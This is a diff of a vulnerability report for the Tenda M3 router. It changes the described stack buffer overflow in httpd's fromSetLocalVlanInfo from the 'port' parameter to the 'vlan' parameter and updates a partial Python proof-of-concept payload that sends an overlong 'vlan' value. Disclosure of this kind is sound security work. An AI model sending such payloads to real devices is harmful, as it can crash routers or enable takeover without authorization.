@@ -1,4 +1,4 @@
-# Tenda M3 contains Stack Overflow Vulnerability
+# Tenda M3 contains Stack Buffer Overflow Vulnerability
 
 ## overview
 
@@ -16,11 +16,13 @@
 
 ### 1. Vulnerability Details
 
-the `httpd` in directory `/bin` has a stack overflow. The vunlerability is in fucntion `fromSetLocalVlanInfo` 
+the `httpd` in directory `/bin` has a stack buffer overflow. The vunlerability is in fucntion `fromSetLocalVlanInfo` 
 
-![image-20220818232658932](readme.assets/image-20220818232658932.png)
+![image-20220819084852048](readme.assets/image-20220819084852048.png)
 
-In this function, is copies POST parameter `port` to stack buffer without checking its length, causing a stack overflow vulnerability. 
+In this function, is copies POST parameter `vlan` to stack buffer without checking its length, causing a stack buffer overflow vulnerability. 
+
+**It is similar to [this vuln](https://github.com/xxy1126/Vuln/tree/main/5), but the parameter is different**
 
 ### 2. Recurring loopholes and POC
 
@@ -36,7 +38,7 @@ import requests
 
 data = {
     "action": "add", 
-    "port": "a"*0x300
+    "vlan": "a"*0x300
 }
 cookies = {
     "user": "admin"
@@ -46,6 +48,5 @@ print(res.content)
 
 ```
 
+![image-20220819084838525](readme.assets/image-20220819084838525.png)
 
-
-![image-20220818232714693](readme.assets/image-20220818232714693.png)
